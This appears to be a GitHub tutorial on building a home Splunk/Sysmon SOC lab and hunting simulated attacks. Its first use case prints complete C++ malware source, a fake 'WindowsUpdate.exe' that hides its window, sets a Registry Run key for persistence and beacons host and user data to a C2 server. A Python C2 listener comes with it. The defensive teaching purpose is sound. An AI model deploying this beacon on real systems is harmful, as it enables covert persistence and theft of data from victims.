<p align="center">
  <img width="600" height="auto" alt="la ilaha illallah muhammadur rasul ullah" src="https://github.com/user-attachments/assets/ea535413-9326-46a8-82b1-4adc81d28cfd" />
</p>

<p align="center">
  I Keep Six Honest Serving Men. They Taught Me All I Know Their Names Are "What, Why, When, Where, Who, And How"</br>
  <i>Rudyard Kipling</i>
</p>

<p align="center">
  <a href="https://linkedin.com/in/gl1t0h">LinkedIn</a> •
  <a href="https://github.com/GL1T0H">GitHub</a> •
  <a href="https://x.com/GL1T0H">X</a> •
  <a href="https://g1it0h.gitbook.io/glitch">Blog</a>
</p>

<h6 align="center">This blog is still a work in progress. Whenever I come across a technique or a specific activity that's worth documenting — whether it's something I stumbled upon in a threat report, a CTF, or just down a rabbit hole at 2am — I'll come back here, break it down, and build a detection for it. The goal isn't to cover everything, it's to keep learning and make sure every technique I write about is something I actually understood, tested, and hunted for myself.</h6>

---

# Introduction
This documentation provides detailed guidance step by step through building your SOC lab from scratch — from setting up the infra, to designing and running attack scenarios, and finally learning how to detect and analyze them using Splunk and more.

## Table of Contents

- [Introduction](#introduction)
- [Project Overview](#project-overview)
- [Infrastructure](#infrastructure)
  - [Infrastructure Diagram (Architecture Schema)](#infrastructure-diagram-architecture-schema)
  - [SIEM Server (Windows 10 Host)](#siem-server-windows-10-host)
  - [Endpoint (Windows 10 VM)](#endpoint-windows-10-vm)
  - [Testing & Log Verification](#testing--log-verification)
- [Use Cases](#Use-Cases)
  - [Use Case 1: The Basic Beacon (Script-Kiddie)](#use-case-1-the-basic-beacon-script-kiddie)
  - [Use Case 2: Phishing via Malicious Word Attachment (Basic)](#Use-Case-2-Phishing-via-Malicious-Word-Attachment)
  - [Use Case 3: Hunting for LSASS Memory Access (Credential Dumping)](#use-case-3-Hunting-for-LSASS-Memory-Access-Credential-Dumping)
  - [Use Case 4: Hunting for Indicator Removal — Catching the Cover-Up](#Use-Case-4-Hunting-for-Indicator-Removal-Catching-the-Cover-Up)

# Project Overview

## What is It?
is a hands-on home SOC lab designed to demonstrate how common attack techniques generate logs and telemetry, and how defenders can detect, investigate, and respond to these attacks using **Splunk**.

This project bridges the gap between **Red Team attack simulation** and **Blue Team detection engineering**, focusing on attacker behavior rather than tools.

## What You Will Learn
By working through this lab, you will learn how to:
- Build a complete SOC lab at home using Splunk
- Simulate realistic attack scenarios in a controlled environment
- Analyze attacker-generated telemetry
- Write effective SPL-based detections
- Think like a SOC analyst and detection engineer

## Lab Architecture
Before we dive into the technical steps, let’s quickly understand the architecture:
- Windows 10 Host (Soc analyst)
  - Runs Splunk Enterprise
  - Acts as the SIEM server
- Windows 10 Virtual Machine (Endpoint)
  - Runs Splunk Universal Forwarder
  - Generates logs (Windows Events + Sysmon)
- Communication
  - Logs are sent from the VM to the host via TCP Port (e.g., 9997)

<img width="1536" height="1024" alt="ChatGPT Image Feb 4, 2026, 12_01_00 AM" src="https://github.com/user-attachments/assets/440b54e4-a3ba-460f-8b35-79f5a5532cdb" />

## Lab Requirements
### Hardware
- Minimum 16 GB RAM (8 GB possible with limitations)
- 100+ GB available disk space
- CPU with virtualization support enabled

## Host Operating System
- Windows 10 or 11

## Virtualization
- VMware Workstation (recommended)
- VirtualBox (alternative)

## Software
- Splunk Enterprise
- Splunk Universal Forwarder
- Windows 10 ISO
- Sysmon
- Some plugs in splunk Enterprise

---

# Infrastructure

## Infrastructure Diagram (Architecture Schema)

#### The infrastructure diagram illustrates a simple SOC lab architecture where a Windows 10 endpoint generates security telemetry using Sysmon and Windows Event Logs. This telemetry is collected and forwarded by the Splunk Universal Forwarder to a centralized Splunk Enterprise SIEM server over TCP port 9997. The SIEM server indexes, stores, and analyzes the incoming logs, enabling detection and alerting use cases.

<img width="1536" height="1024" alt="ChatGPT Image Feb 4, 2026, 12_01_00 AM" src="https://github.com/user-attachments/assets/440b54e4-a3ba-460f-8b35-79f5a5532cdb" />

## SIEM Server (Windows 10 Host)

### Splunk Enterprise Setup & Installation
First, in our **Windows 10 (HOST)** navigate to splunk.com and create a free account if you haven’t already And download the latest version of Splunk Enterprise
([https://www.splunk.com/en_us/download.html](https://www.splunk.com/en_us/download.html))

<p align="left">
  <img width="40%" alt="Screenshot_1" src="https://github.com/user-attachments/assets/946943b0-35c6-453e-a38a-c1c6068afdc9" />
  <img width="40%" alt="Screenshot_2" src="https://github.com/user-attachments/assets/24ef079d-6e64-4543-9550-fb4a201d4321" />
</p>

After downloading the .MSI, we are going to setup it. The process is simple, just a three click step.
1. Accept license agreement., and click next

<img alt="Screenshot_3" src="https://github.com/user-attachments/assets/b74c62ee-26d8-4592-aa53-6d3f03a4e9ff" />

2. In the next step, we are going to setup the username and password that will be required to access the web GUI of Splunk

<img alt="Screenshot_4" src="https://github.com/user-attachments/assets/234a583e-8eda-4a8a-b02d-990020dfee6b" />

3. Hit the Install Button, And Finish

<p align="left">
  <img width="40%" alt="Screenshot_5" src="https://github.com/user-attachments/assets/cd8076a9-41a2-4e16-960a-781ed22c367b" />
  <img width="40%" alt="Screenshot_6" src="https://github.com/user-attachments/assets/879f6a6d-c608-45ec-9dee-bc5e85cffcc5" />
</p>

After The installation process Finish, Splunk GUI will open in the browser.
Here’s the SPLUNK login page and we will require the credentials that was setup during installation process:

<img width="1400" height="611" alt="Screenshot_7" src="https://github.com/user-attachments/assets/538fd714-a483-4219-9bf9-fe241cbe9653" />

At this point, Splunk Enterprise is installed but not yet configured to receive logs.

### Initial Splunk Configuration
Splunk Enterprise is managed through its web interface, called Splunk Web.
1. Open your browser and navigate to: http://localhost:8000
2. Log in using the credentials you created during installation.

<img width="1365" height="623" alt="Screenshot_8" src="https://github.com/user-attachments/assets/ca0dd4a1-4db2-4e6b-843a-08ddad5854e5" />

#### Configure Receiving Port
To allow log ingestion from forwarders:
1. Go to -> Settings -> Forwarding and Receiving

<img width="1363" height="615" alt="Screenshot_9" src="https://github.com/user-attachments/assets/c0d48916-a038-48ad-aa10-973ad4aeafe6" />

Set port 9997 as the listening port for incoming logs.

<img width="1365" height="621" alt="Screenshot_10" src="https://github.com/user-attachments/assets/3a17531a-d11d-456f-98df-04eebe1e213b" />
<img width="1365" height="629" alt="Screenshot_11" src="https://github.com/user-attachments/assets/975a5346-6c81-4032-9c51-f2597248ea51" />


#### Configure Indexes
In Splunk, indexes are storage locations where incoming data is organized and kept for searching and analysis. They help Splunk quickly retrieve and manage large volumes of log or event data efficiently.W
We will Configure 4 indexes
- windows_system
- windows_security
- windows_application
- sysmon
I will explain how to do it once and you can do the same for the 4 indexes
1. Go to -> Settings -> Indexes

<img width="1361" height="616" alt="Screenshot_15" src="https://github.com/user-attachments/assets/56b0981b-5e4e-45f3-9a17-cd8215a8d3e5" />

2. From The Indexes window click **New Index**

<img width="1363" height="620" alt="Screenshot_16" src="https://github.com/user-attachments/assets/b3c5c9ea-9784-4455-a6fc-4bfe8ae1fc74" />

3. From The new Window type the index name (i.s sysmon) and keep everything in default and hit **Save**

<img width="1052" height="597" alt="Screenshot_17" src="https://github.com/user-attachments/assets/6db9fae2-c3a6-462a-a424-8e8e0c0ba8f9" />

Do the same with the 3 left indexes
> [!NOTE]
> Tall now the indexes will not work until we configure it on splunk UF so do it and keep going with me

#### Configure Windows Firewall
Make sure the port is accessible:
1. Open Windows Defender Firewall
Click on Inbound Rules -> New Rule -> Port and hit next

<img width="1213" height="728" alt="Screenshot_12" src="https://github.com/user-attachments/assets/37eb8791-8cf9-496f-a9bf-cffa9389f9fa" />

choose TCP and The Port we sit in splunk (9997)

<img width="750" height="610" alt="Screenshot_13" src="https://github.com/user-attachments/assets/f5045738-53bf-4bac-97cc-170c96c4a01f" />

Next -> "Allow The Connection" -> Next -> Next -> Pick a Name Like ("Splunk Port") And Hit Finish

<img width="1025" height="349" alt="Screenshot_14" src="https://github.com/user-attachments/assets/f31c9d6b-2021-4edf-a228-e61dfafa92c6" />

### Add-ons & Apps Configuration
A Splunk Add-on is a package that allows Splunk to collect, parse, and normalize data from a specific source. It extends Splunk’s capabilities without adding dashboards or visualizations.
We will use Microsoft Sysmon Add-on & Splunk Add-on for Microsoft Windows

lets start with **Microsoft Sysmon Add-on** To install it go to https://splunkbase.splunk.com/app/5709
Login and hit download

<img width="1344" height="619" alt="Screenshot_18" src="https://github.com/user-attachments/assets/2d98140d-9ff5-4b33-99f9-d0c409c7e0c5" />

You will find the .gtz file in downloads folder

<img width="882" height="124" alt="Screenshot_19" src="https://github.com/user-attachments/assets/52e0e804-7923-484f-ad30-a7eb46d47b08" />

Now back to splunk GUI, From home click on Apps And Manage Apps

<img width="1356" height="622" alt="Screenshot_20" src="https://github.com/user-attachments/assets/3ab15148-a481-4bdc-8432-c312eebc5201" />

From Apps Window Click on **Install App From File**

<img width="1364" height="625" alt="Screenshot_21" src="https://github.com/user-attachments/assets/132781cc-8bec-41d6-b5b3-614d12294580" />

Drag And Drop the .gtz File or Just Select It and click **Upload**

<img width="1360" height="627" alt="Screenshot_22" src="https://github.com/user-attachments/assets/6ca28f73-be95-4420-a401-aae764654b7d" />

After That you need to restart Splunk Like That `Splunk.exe restart`

<img width="953" height="491" alt="Screenshot_23" src="https://github.com/user-attachments/assets/be5ce9fd-2ebf-4641-a779-a956e71b427d" />

After Restart Back to **Apps** Window search by sysmon and you will find it like that

<img width="1359" height="483" alt="Screenshot_24" src="https://github.com/user-attachments/assets/7ee38f5e-f1c7-4a27-8a28-e0356b65b150" />

You can do the Same With **Splunk Add-on for Microsoft Windows**

---

## Endpoint (Windows 10 VM)

### Setting Up Windows 10 on VMware
In this section, we will not dive deeply into the Windows 10 installation process on VMware.  
To keep the article concise and focused, we will skip the step-by-step installation details.  
Instead, you can see this video tutorial: https://www.youtube.com/watch?v=C-avnck74gs.  
If you are not familiar with installing Windows 10 on VMware, this video will guide you through the process.

> [!NOTE]
> Make two network adapters one **Host-Only** and one **NAT**

Once the Windows 10 VM is installed normally and running, we will move on to the next step.

### Sysmon Installation & Configuration
Sysmon (System Monitor) is a Windows system service that provides detailed visibility into what is happening on an endpoint.  
It helps us track important activities like process creation, network connections, file creation, and registry changes.

In short, Sysmon gives us high-quality logs that are very useful for detection and analysis inside Splunk.

#### Download Sysmon
First, download Sysmon from the official Microsoft Sysinternals website on the endpoint (Win 10 VM)\
(https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

<img width="1362" height="692" alt="Screenshot_25" src="https://github.com/user-attachments/assets/6ef76c8f-a1bd-48f9-b96d-cee29f00f854" />

Copy The .ZIP File to **C** directory and extracting the files

<img width="1089" height="281" alt="Screenshot_26" src="https://github.com/user-attachments/assets/1ae9b15d-ecde-4b8a-b38a-b48f20a381c8" />

#### Download Sysmon Configuration (SwiftOnSecurity)
By default, Sysmon does not log much unless it is configured properly.  
To solve this, we will use the popular Sysmon configuration created by **SwiftOnSecurity**,.  
which provides a good balance between visibility and noise.

Download the configuration file and save it in the C partition ( C:\sysmon\ ) [SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml)

<img width="1363" height="624" alt="Screenshot_28" src="https://github.com/user-attachments/assets/9dce296e-e9ab-4c67-8cf6-496ef301d51d" />

After That, Open **Command Prompt as Administrator**, then run the following command: `Sysmon64.exe -i sysmonconfig.xml`
This command installs Sysmon and applies the configuration at the same time.

<img width="977" height="509" alt="Screenshot_27" src="https://github.com/user-attachments/assets/e56a4341-6e48-46a6-9ecb-041c2606af96" />

#### Verification & Testing
To confirm that Sysmon is working correctly:
- From The previous cmd type: `calc.exe` 
- Open **Event Viewer**
- Navigate to: Applications and Services Logs → Microsoft → Windows → Sysmon → Operational.  
Now check that events are being generated (such as process creation for the **calc.exe**)

<img width="1365" height="718" alt="Screenshot_29" src="https://github.com/user-attachments/assets/8ed2ad6d-0aa1-406f-b4dc-c35dd648ae0f" />

Once Sysmon events are visible, we are ready to move forward and start forwarding these logs to Splunk.

### Splunk Universal Forwarder Setup & Installation

#### What is Splunk Universal Forwarder?

Splunk Universal Forwarder (UF) is a lightweight agent installed on endpoints to collect and forward logs to a Splunk instance.

It does not index or search data by itself.  
Its only job is to collect logs from the system and send them securely to the SIEM server (Splunk Enterprise).

In our lab, the Universal Forwarder will be installed on the Windows 10 VM and will forward to the Splunk Enterprise running on the host machine:
- Windows Event Logs
- Sysmon logs

#### Download Splunk Universal Forwarder

Download the Splunk Universal Forwarder from the official Splunk website. (https://www.splunk.com/en_us/download/universal-forwarder.html)

<img width="956" height="459" alt="Screenshot_30" src="https://github.com/user-attachments/assets/e85a59db-c670-45f1-adc2-79f03148238e" />

Once downloaded, move the installer to the Windows 10 VM.

<img width="1365" height="735" alt="Screenshot_31" src="https://github.com/user-attachments/assets/cf0be003-b72d-47f7-8d34-9d2177eedc50" />

#### Setup & Installation
Run the Universal Forwarder installer as a Administrator.

- Accept the license agreement

<img width="515" height="397" alt="Screenshot_32" src="https://github.com/user-attachments/assets/01d36488-097e-49b7-a3f9-1da5f723246c" />

- As we aren’t using any SSL certificate, so we will skip that:
> Since this lab does not use SSL certificates, we can safely skip this step to keep the setup simple.

<img width="530" height="409" alt="Screenshot_33" src="https://github.com/user-attachments/assets/a1c68d9a-8d12-4958-adac-0adbd65d05c0" />

- Choose **Local System** as the service account
> Using the Local System account allows the Universal Forwarder to access Windows Event Logs and other system-level resources without additional configuration.

<img width="549" height="424" alt="Screenshot_34" src="https://github.com/user-attachments/assets/9c60032b-de72-4905-aa9d-0961b402400c" />

- Select what you need to be send to splunk EP
> At this stage, you choose which logs and data sources will be forwarded from the endpoint to the SIEM server.
> This typically includes Windows Event Logs, and Sysmon logs will be configured in more detail later.

<img width="534" height="414" alt="Screenshot_35" src="https://github.com/user-attachments/assets/359ef20e-fcaf-4882-beb0-2519a7d23bee" />

- Create a username & password and note it down
> m4 m7taga 4ar7 yasta

<img width="552" height="417" alt="Screenshot_36" src="https://github.com/user-attachments/assets/c83b0310-36e5-4c7d-90e0-cb3ffd112f44" />

- Enter the IP address of your Splunk Enterprise server (Windows 10 Host)
> This allows the Universal Forwarder to know where to send the collected logs.

<p align="left">
  <img width="40%" height="401" alt="Screenshot_37" src="https://github.com/user-attachments/assets/1d0b0553-1643-491d-9402-460d886ca8e2" />
  <img width="40%" height="401" alt="Screenshot_38" src="https://github.com/user-attachments/assets/72a1e8c2-7ca4-4d61-9fef-5bbba6893703" />
</p>

- Hit Next it will take around 2 to 3 minutes to finish the installation.

<img width="548" height="428" alt="Screenshot_39" src="https://github.com/user-attachments/assets/2f66a8f1-b0f8-4d2e-a5bd-05fd56f29e41" />

After the installation is completed, the Universal Forwarder service should start automatically.  
Try This: `sc query SplunkForwarder` You should see STATE: 4 RUNNING. Like That

<img width="1024" height="567" alt="Screenshot_40" src="https://github.com/user-attachments/assets/1b95de11-af65-4b69-9bcc-c5953f83764c" />

Here’s the host name of my machine, that will be used in next steps in the confirmation of successful log ingestion:

<img width="1365" height="594" alt="Screenshot_41" src="https://github.com/user-attachments/assets/3c419c59-d24c-4d5c-a794-a8e013232904" />

Now, we will verify that logs receiving in the SPLUNK or not. Go to the **Search** tab:

<img width="1363" height="621" alt="Screenshot_42" src="https://github.com/user-attachments/assets/dde9a611-bc6c-4717-9f6a-0996f4a03ae7" />

Upon clicking the “Data Summary” button, a new pop-up window will appear and we will be able to see our Windows machine hostname, as well as the source types/log types that we selected during the installation process:

<img width="795" height="286" alt="Screenshot_43" src="https://github.com/user-attachments/assets/058fad44-a669-4944-b85a-13a32f18f1ee" />

Okay Lets Go through the Configuration part

### Splunk Universal Forwarder Configuration

At this stage, we define exactly which logs we want to collect from the endpoint and forward to Splunk Enterprise.

| File Path                                             | Purpose                                                               |
| ----------------------------------------------------- | --------------------------------------------------------------------- |
| `etc\apps\SplunkUniversalForwarder\local\inputs.conf` | Controls **how logs are collected from Windows**                      |
| `etc\system\local\inputs.conf`                        | Controls **where logs are stored and how they are labeled in Splunk** |


#### Configuration C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf
Navigate to the following directory on the Windows 10 VM: `C:\Program Files\SplunkUniversalForwarder\etc\system\local`.  
If the `inputs.conf` file does not exist, create it manually.

This configuration specifies:
- The hostname that appears inside Splunk
- Which Windows logs to collect
- Which index each log type is sent to
- Which sourcetype is applied

<img width="1207" height="626" alt="Screenshot_44" src="https://github.com/user-attachments/assets/ecec8547-9327-4428-b58b-6172143c75dd" />

After Creating the File set this Configuration
```ini
[default]
host = Endpoint-1

[WinEventLog://Security]
disabled = false
index = windows_security

[WinEventLog://System]
disabled = false
index = windows_system

[WinEventLog://Application]
disabled = false
index = windows_application

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = false
index = sysmon
sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
renderXml = false
```

<img width="1154" height="548" alt="Screenshot_45" src="https://github.com/user-attachments/assets/b01f542e-8b11-4033-8382-2d9c7d3c1da3" />


#### Configuration C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local\inputs.conf
Navigate to the following directory on the Windows 10 VM: `C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local\`.  
If the `inputs.conf` file does not exist, create it manually.

This configuration specifies:
- How logs are read from Windows
- From which point logs are collected
- Collection behavior (checkpoint, history, real-time)
  
<img width="1176" height="630" alt="Screenshot_47" src="https://github.com/user-attachments/assets/2902ba7d-b0d7-4125-b3fe-efbe3322d5b1" />

set this Configuration

```ini
[WinEventLog://Application]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest

[WinEventLog://Security]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest

[WinEventLog://System]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
checkpointInterval = 5
current_only = 0
disabled = 0
start_from = oldest
```

<img width="1193" height="587" alt="Screenshot_48" src="https://github.com/user-attachments/assets/d98b5151-cd3d-4fbb-aaa7-870095c6beb8" />


After saving the files, restart the Splunk Universal Forwarder service to apply the changes\
Once restarted, the endpoint will begin sending logs to Splunk Enterprise based on this configuration.

<img width="1003" height="529" alt="Screenshot_46" src="https://github.com/user-attachments/assets/bdb4bf33-401a-4c36-bce9-97ae187941b2" />

## Testing & Log Verification
Now let's validate that logs are being correctly generated, forwarded, and indexed in Splunk
1. Make sure the Splunk Universal Forwarder service is running -> `sc query splunkforwarder`

<img width="623" height="196" alt="Screenshot_49" src="https://github.com/user-attachments/assets/3eb61749-ffd7-4c8d-b96f-f9d3942f78d8" />

2. To confirm log collection, generate some test events on the endpoint:
<img width="981" height="404" alt="Screenshot_50" src="https://github.com/user-attachments/assets/c7eb0ab2-617a-4296-bafe-c74065883f23" />

3. Back to splunk and in search box type `index=* host="Endpoint-1"`.  
U will see that sysmon log source gen 3 logs:
  - 1 Dns Query
  - 2 Process Create

<img width="1363" height="651" alt="Screenshot_51" src="https://github.com/user-attachments/assets/32ac88e9-9b83-4097-b50c-c2e0d4c0e757" />

---

# Use Cases
In this section, we will start building realistic attack scenarios to better understand how attacks happen in real environments.  
The main goal is not exploitation itself, but learning how attackers think and operate, even at a basic level.  

By simulating these scenarios, we will generate real logs and events inside our environment.  
These logs will help us understand how attacks look from a defensive POV, how they appear in the SIEM, and how we can detect, investigate, and confirm if such activity happened in our environment.  

Each attack scenario will later be mapped to MITRE ATT&CK and used to build detection use cases and alerts.  

## Use Case 1: The Basic Beacon (Script-Kiddie)

### Scenario Overview

In this scenario, we simulate a common entry-level malware infection. The attacker delivers a standalone executable (`WindowsUpdate.exe`) that, once executed, ensures its survival across system reboots and establishes a persistent communication channel with a Command and Control (C2) server to exfiltrate basic host information.

---

### Attack Flow

1. **Initial Access:** The user manually executes the malicious binary.
2. **Evasion:** The malware immediately hides its console window to run silently in the background.
3. **Persistence:** The malware modifies the Windows Registry `Run` key to ensure it starts automatically every time the user logs in.
4. **Discovery:** It queries the OS for the computer name, current username, and OS version.
5. **C2 & Exfiltration:** It initiates a periodic "Beaconing" process every 30 seconds, sending the gathered data via HTTP POST requests to the attacker's server.

---

### MITRE ATT&CK Mapping

| Stage | Action | MITRE ATT&CK ID | Artifacts / Logs |
| --- | --- | --- | --- |
| **Initial Execution** | User runs the `.exe` manually. | **User Execution (T1204.002)** | Sysmon Event ID 1 (Process Creation) |
| **Persistence** | Adds binary path to `HKCU\..\Run` key. | **Boot or Logon Autostart (T1547.001)** | Sysmon Event ID 13 (Registry Value Set) |
| **Discovery** | Collects Hostname, Username, and OS info. | **System Information Discovery (T1082)** | API Monitoring / EDR Telemetry |
| **C2 Channel** | Establishes HTTP communication (Port 8080). | **Application Layer Protocol (T1071.001)** | Sysmon Event ID 3 (Network Connection) |
| **Exfiltration** | Sends system info within the HTTP Body. | **Exfiltration Over C2 Channel (T1041)** | Network Traffic / PCAP Analysis |

---

### Environment & Malware Setup

#### Malware Source Code (C++)

> **Note:** This code is compiled for Scenario 1. It focuses on basic persistence and clear beaconing patterns.

```cpp
#include <iostream>
#include <string>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

using namespace std;

// C2 Server Configuration
string C2_IP = "YOUR_C2_IP_ADDRESS"; // I AM USING KALI LINUX
int C2_PORT = 8080;

// [T1547.001] Persistence: Writing to Registry Run Key
void EstablishPersistence() {
    char path[MAX_PATH];
    // Get the full path of the current running executable
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HKEY hKey;
    // Open the Registry Key for the current user's auto-run programs
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Create a new value "WindowsDiagnostic" pointing to our malware path
        RegSetValueExA(hKey, "WindowsDiagnostic", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

// [T1082] Discovery: Gathering Host Information
string GatherSystemInfo() {
    char buffer[256];
    DWORD size = sizeof(buffer);
    string info = "";

    // Retrieve the computer name
    if (GetComputerNameA(buffer, &size)) {
        info += "Hostname: " + string(buffer) + " | ";
    }

    // Retrieve the current active username
    size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) {
        info += "User: " + string(buffer) + " | ";
    }

    return info;
}

// [T1071.001] C2 Communication: Sending Data via HTTP POST
void SendDataToC2(string data) {
    // Initialize the Windows Internet (WinINet) session
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hSession) {
        // Connect to the C2 server IP and Port
        HINTERNET hConnect = InternetConnectA(hSession, C2_IP.c_str(), C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            // Prepare an HTTP POST request to the /update endpoint
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/update", NULL, NULL, NULL, 0, 0);
            if (hRequest) {
                // Send the collected system info in the request body
                HttpSendRequestA(hRequest, NULL, 0, (LPVOID)data.c_str(), data.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
}

int main() {
    // [Evasion] Stealth: Hide the console window immediately upon execution
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);

    // Run persistence once
    EstablishPersistence();

    // Main Beaconing Loop
    while (true) {
        string systemInfo = GatherSystemInfo();
        SendDataToC2(systemInfo);
        
        // Wait for 30 seconds before the next check-in (Beacon)
        Sleep(30000); 
    }
    return 0;
}

```
After Put it in The Enpoint (VM)
<img width="1134" height="591" alt="Screenshot_55" src="https://github.com/user-attachments/assets/0003883c-77aa-4980-9afd-e9226d7e3479" />

---

#### C2 Server Setup (Python)

> **Standard Listener:** This Python script acts as our centralized Command & Control server. It will be used consistently across Scenarios 1, 2, and 3 to log incoming exfiltrated data into a local text file.

```python
# Save this as C2.py on your Attacker Machine
# Usage: python3 C2.py

import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime

LOG_FILE = "C2_Exfiltrated_Data.txt"

class MegaC2Handler(BaseHTTPRequestHandler):
    
    def log_to_file(self, client_ip, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"--- New Beacon ---\n")
            f.write(f"Time: {timestamp}\n")
            f.write(f"From: {client_ip}\n")
            f.write(f"Data: {data}\n")
            f.write("-" * 20 + "\n")

    def do_POST(self):
       
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        client_ip = self.client_address[0]
        
        print(f"\n\033[92m[+] Received Beacon from {client_ip}\033[0m")
        print(f"\033[94m[!] Data: {post_data}\033[0m")
        
        self.log_to_file(client_ip, post_data)
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return

def run_server():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, MegaC2Handler)
    print("\033[91m" + "="*40 + "\033[0m")
    print("\033[1m  RED2BLUE - C2 LISTENER STARTED  \033[0m")
    print(f"\033[93m Listening on port 8080... \033[0m")
    print(f"\033[93m Logs will be saved to: {LOG_FILE} \033[0m")
    print("\033[91m" + "="*40 + "\033[0m")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server Stopping...")
        httpd.server_close()

if __name__ == "__main__":
    run_server()

```
That When The Malware Executed
<img width="1283" height="555" alt="Screenshot_60" src="https://github.com/user-attachments/assets/f98f03a8-cb67-4233-b549-1cd10aa9b71b" />


---

## Hunting

## Use Case 1: The Basic Beacon (Script-Kiddie)

### Overview
The attacker delivers a malicious executable named:
*WindowsUpdate.exe*

After execution, the malware performs the following:
- Establishes persistence via Registry Run Key
- Initiates outbound communication to a Command & Control (C2) server
- Begins periodic beaconing to exfiltrate system data

### Log Analysis
Now that the scenario has been executed, we move to Splunk to analyze the logs generated by the attack.

The goal here is to:
- Understand how the attack looks from a defensive perspective
- Follow the attack timeline step by step
- Identify key artifacts and behaviors
- Extract useful Indicators of Compromise (IOCs)

> ⚠️ This is a very basic scenario, and everything is intentionally clear and straightforward. Later scenarios will be more complex and realistic

#### Starting Point: Raw Log Visibility
We begin with a broad query to gain full visibility over the endpoint activity:
`index=* host="DESKTOP-MOPLS2N" | search NOT Image="*splunk-*.exe*"`
Why this matters:
We start wide to avoid missing anything important
Filtering by host isolates the victim machine
Excluding Splunk-related processes reduces noise and improves clarity

At this stage, we are not hunting yet — we are simply observing what happened.
<img width="1354" height="369" alt="image" src="https://github.com/user-attachments/assets/a06b96b5-160c-4a09-9724-84ca51cb5b9a" />

#### File Drop Evidence
After transferring the malware (WindowsUpdate.exe) into the system (via Copy/Paste or Drag & Drop), we observe the following:

EventCode = 11 → File Created\
EventCode = 2 → File Time Modified

<img width="1114" height="282" alt="Screenshot_62" src="https://github.com/user-attachments/assets/2b89f407-8213-4bf5-a7a6-4870bb2b1b1e" />

Analysis:
These events confirm that a new file was introduced into the system.
- Event 11: gives us the exact file path and creation details
- Event  2: indicates timestamp modification, which naturally occurs during file transfers

While these events are normal, they become important when correlated with suspicious filenames or locations.

<img width="1112" height="468" alt="Screenshot_63" src="https://github.com/user-attachments/assets/7781a15e-5ad4-4e8d-9415-d2ede4dc3748" />


#### Payload Tracking & Pivoting
To move from general observation to focused investigation, we pivot using the malware name:\
`index=* host="DESKTOP-MOPLS2N" "WindowsUpdate.exe"`
Why pivoting is important:
- It isolates all activity related to the payload
- Helps build a clean timeline of attacker actions
- Reduces noise significantly

From this point forward, every event we analyze is directly tied to the malware.
<img width="1357" height="620" alt="Screenshot_64" src="https://github.com/user-attachments/assets/a623dbd3-62e7-4d37-9227-f0e93cf6e2e7" />


#### Initial Execution (EventCode 1)
This event confirms that the malware was executed.

**Maps to: User Execution (T1204.002)**
Key insights:\
The presence of WindowsUpdate.exe as a running process confirms execution
Parent process data helps identify how it was launched
Command-line arguments may reveal additional behavior

This is the exact moment where the attack becomes active.
<img width="1138" height="598" alt="Screenshot_65" src="https://github.com/user-attachments/assets/656688af-560e-45e0-bbd7-d7658bb4ade1" />

And From The Victim Side U can see the process in the taskmanger
<img width="658" height="261" alt="Screenshot_61" src="https://github.com/user-attachments/assets/1c340fac-c001-4e74-b8dc-06ddc2297a75" />


#### Persistence Mechanism (EventCode 13)
This event indicates that the malware modified the Windows Registry.

Maps to: Boot or Logon Autostart Execution (T1547.001)
What happened:
**The malware added itself to the following key:**
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

Why this is critical:
- Ensures the malware runs automatically on every login
- Survives system reboots
- Common technique used by attackers
<img width="1102" height="484" alt="Screenshot_66" src="https://github.com/user-attachments/assets/d886ec73-e8ee-4f53-a472-6d7377b7d6ff" />

And we can check out the **regedit** and you will see that the registry key was added indeed
<img width="1031" height="433" alt="Screenshot_59" src="https://github.com/user-attachments/assets/7711754d-04d5-4c84-952c-a6b188bbb4a0" />


#### C2 Communication Channel (EventCode 3)
This event shows outbound network communication initiated by the malware.

Maps to: Application Layer Protocol (T1071.001)
Observed behavior:
- Source IP: 192.168.200.128 (victim)
- Destination IP: 192.168.200.129 (C2 server)
- Port: 8080
- Process: WindowsUpdate.exe

Analysis:
- The process initiating the connection is the malware itself The destination is external and controlled by the attacker Communication happens over HTTP

This confirms the establishment of a Command & Control (C2) channel.
<img width="1106" height="589" alt="Screenshot_67" src="https://github.com/user-attachments/assets/2aae9424-9132-46b7-ab7a-719501d2671f" />

And By analyzing timestamps of repeated network events, we observe:
- Multiple connections to the same IP
- Consistent interval of 30 seconds

